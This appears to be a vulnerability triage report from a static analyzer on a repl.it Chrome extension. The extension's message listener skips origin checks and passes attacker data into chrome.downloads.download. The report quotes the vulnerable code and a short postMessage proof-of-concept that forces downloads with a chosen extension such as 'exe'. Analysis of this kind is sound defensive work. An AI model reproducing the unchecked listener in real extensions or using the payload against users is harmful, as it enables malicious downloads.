# CoCo Analysis: pgmcojeijjhacgkkjaakdafmloncpema

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both related to same vulnerability)

---

## Sink 1: cs_window_eventListener_message → chrome_downloads_download_sink (data field)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 475: window.addEventListener("message", event => {
Line 478: if (event.data.type === "replit_download") {
Line 483: data: event.data.data,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/bg.js
Line 974: url: "data:text/plain;charset=utf-8," + encodeURIComponent(request.data),
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message", event => { // ← No origin validation!
	// if the event was to download, send a download request to the background script
	if (event.data.type === "replit_download") {
		// send request to background script
		chrome.runtime.sendMessage({
			type: "download",
			data: event.data.data, // ← attacker-controlled
			extension: event.data.extension, // ← attacker-controlled
		});
	}
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
	// if the request was to start a download, start a download
	if (request.type === "download") {
		// start the download
		chrome.downloads.download({
			filename: "program." + request.extension, // ← attacker-controlled filename
			url: "data:text/plain;charset=utf-8," + encodeURIComponent(request.data), // ← attacker-controlled content
			saveAs: true
		});
	}
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage via content script

**Attack:**

```javascript
// On any page matching https://repl.it/*, an attacker (or malicious script) can inject:
window.postMessage({
    type: "replit_download",
    data: "malicious content here",
    extension: "exe" // or any extension
}, "*");

// This triggers an arbitrary download with attacker-controlled filename and content
```

**Impact:** Attacker can trigger arbitrary downloads with controlled filenames and content. While the content is limited to text/plain data URIs (not direct URL downloads), the attacker controls both the filename extension and file content, which could be used for social engineering attacks (e.g., downloading "invoice.exe" with malicious content disguised as text).

---

## Sink 2: cs_window_eventListener_message → chrome_downloads_download_sink (extension field)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 475: window.addEventListener("message", event => {
Line 478: if (event.data.type === "replit_download") {
Line 484: extension: event.data.extension,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/bg.js
Line 973: filename: "program." + request.extension,
```

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, different field. Both the `data` and `extension` fields are attacker-controlled and flow into the `chrome.downloads.download()` sink without validation. This allows arbitrary file extension spoofing in the download filename.
